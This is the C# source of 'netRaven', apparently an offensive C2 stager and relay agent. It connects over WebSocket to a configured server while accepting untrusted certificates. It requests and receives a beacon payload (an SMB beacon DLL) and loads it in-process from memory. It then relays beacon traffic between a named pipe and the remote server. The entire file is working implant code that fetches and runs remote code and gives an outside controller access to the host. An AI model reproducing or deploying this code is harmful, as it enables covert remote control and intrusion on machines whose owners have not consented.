using System;
using System.Text;
using System.IO.Pipes;
using System.IO;
using System.Threading;
using WebSocket4Net;
using System.Web.Script.Serialization;
using System.Collections.Generic;

namespace netRaven
{
    public class Core
    {
        // Starts netRaven
        private static string agentID = Guid.NewGuid().ToString();
        private static bool bacon = false;
        private static bool dataAvailable = false;
        private static JavaScriptSerializer ser = new JavaScriptSerializer(new SimpleTypeResolver());
        private static config configuration = new config();
        private static NamedPipeClientStream client = new NamedPipeClientStream(".", configuration.pipeName, PipeDirection.InOut);
        private static WebSocket socket;
        private static int max_buffer_size = 1024 * 1024;

        // Method to start netRaven
        public static void Run(string throwaway)
        {
#if DEBUG
            Console.WriteLine("Obtained raven configuration from the embedded resource");
#endif
            // Establish a connection to the websocket server
            socket = new WebSocket(configuration.server);
            // Setup the event handlers
            socket.Opened += new EventHandler(on_open);
            socket.Error += new EventHandler<SuperSocket.ClientEngine.ErrorEventArgs>(on_error);
            socket.Closed += new EventHandler(on_closed);
            socket.MessageReceived += new EventHandler<MessageReceivedEventArgs>(on_receive);

            socket.AllowUnstrustedCertificate = true;

            socket.Open();

            while (socket.State == WebSocketState.Connecting && socket.State != WebSocketState.Open)
            {
                Thread.Sleep(1000);
            }


            // If auto is true, send a stage request
            if (configuration.auto)
            {
                RavenUpgrade();
            }

            //Thread.Sleep(30000);
            while (socket.State == WebSocketState.Open)
            {
                // If beacon is active, connected, and there is data available to read.
                if (bacon && client.IsConnected && dataAvailable)
                {
                    
                    byte[] buf = new byte[max_buffer_size];

                    int read = readFrame(client, ref buf);
                    dataAvailable = false;
                    if (read < 0)
                    {
                        bacon = false;
                        continue;
                    }

                    byte[] frame = new byte[4 + read];
                    byte[] size = BitConverter.GetBytes(read);
                    Buffer.BlockCopy(size, 0, frame, 0, size.Length);
                    Buffer.BlockCopy(buf, 0, frame, size.Length, read);

                    RavenMessage newMsg = new RavenMessage();
                    newMsg.msgType = (int)MsgType.beacon;
                    newMsg.length = frame.Length;
                    newMsg.data = Convert.ToBase64String(frame);

                    string jsonMsg = ser.Serialize(newMsg);
                    socket.Send(jsonMsg);
                    
                }


                Thread.Sleep(1000);
            }

            // Clean up and exit
            
            client.Close();
            client.Dispose();
            

            Environment.Exit(0);
        }

        public static void RavenUpgrade()
        {
            string arch = "";
            // Send the stage request

            if (IntPtr.Size == 8)
                arch = "x64";
            else
                arch = "x86";

            byte[] stageReq = Encoding.ASCII.GetBytes(agentID + ":" + arch + ":" + configuration.pipeName + ":" + configuration.block.ToString());
#if DEBUG
            Console.WriteLine("Sending stage request to server");
#endif
            string encData = Convert.ToBase64String(stageReq);

            RavenMessage newMsg = new RavenMessage();
            newMsg.msgType = (int)MsgType.stage;
            newMsg.length = encData.Length;
            newMsg.data = encData;

            // Serialize the class into json
            string jsonString = ser.Serialize(newMsg);

            // Send to the contoller
            socket.Send(jsonString);
        }

        private static void on_receive(object sender, MessageReceivedEventArgs e)
        {
            // Process every message received

            // Serialize the string into a RavenMessage object
            RavenMessage msg = ser.Deserialize<RavenMessage>(e.Message);
            MsgType t = (MsgType)msg.msgType;
            switch (t)
            {
                case MsgType.stage:
                    byte[] payload = Convert.FromBase64String(msg.data);
                    if (payload.Length > 1)
                    {
                        //Trim the frame header
                        payload = new List<byte>(payload).GetRange(4, payload.Length - 4).ToArray();
#if DEBUG
                        File.WriteAllBytes("C:\\Windows\\Tasks\\smb_beacon.dll", payload);
                        Console.WriteLine("Beacon payload written to: C:\\Windows\\Tasks\\smb_beacon.dll");
#endif 
                        Loader ldr = new Loader(payload);

                        Thread beaconThread = new Thread(() =>
                        {
                            ldr.LoadInCurrentProcess();
                        });

                        beaconThread.Start();
                        ConnectToBeacon();
                        dataAvailable = true;
                    }
                    
                    break;
                case MsgType.beacon:
                    byte[] frame = Convert.FromBase64String(msg.data);
                    writeFrame(client, frame);
                    dataAvailable = true;
                    break;
                case MsgType.task:
                    break;
                case MsgType.key:
                    break;
                default:
                    break;
            }
        }

        private static void on_error(object sender, SuperSocket.ClientEngine.ErrorEventArgs e)
        {
#if DEBUG
            Console.WriteLine("Received error from the raven server: " + e.Exception.Message);
#endif
        }

        private static void on_open(object sender, EventArgs e)
        {

        }

        private static void on_closed(object sender, EventArgs e)
        {

        }

        private static void ConnectToBeacon()
        {
            
            try
            {
                client.Connect(5000);
                bacon = true;
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine("Unable to connect to beacon: " + e.ToString());
#endif
                bacon = false;
            }
        }

        private static int readFrame(NamedPipeClientStream pipe, ref byte[] buffer)
        {
            byte[] size = new byte[4];
            int bytesRead = 0;
            int total = 0;
            bytesRead = pipe.Read(size, 0, 4);
            int numSize = BitConverter.ToInt32(size, 0);

            while (total < numSize)
            {
                bytesRead = pipe.Read(buffer, total, numSize - total);
                total += bytesRead;

                Thread.Sleep(100);
            }

            return numSize;

        }

        private static void writeFrame(NamedPipeClientStream pipe, byte[] buffer)
        {
            pipe.Write(buffer, 0, 4);
            pipe.Write(buffer, 4, buffer.Length - 4);
        }
    }

    public class config
    {
        public string server;
        public string pipeName;
        public int block;
        public bool auto;

        public config()
        {
            auto = (bool)Properties.Resources.ResourceManager.GetObject("auto");
            block = (int)Properties.Resources.ResourceManager.GetObject("block");
            pipeName = Properties.Resources.ResourceManager.GetString("pipename");
            server = Properties.Resources.ResourceManager.GetString("server");
        }
    }

    public enum MsgType
    {
        stage =     1,
        beacon =    2,
        task =      3,
        key =       4
    }

    public class RavenMessage
    {
        public int msgType;
        public int length;
        public string data;
    }
    
}
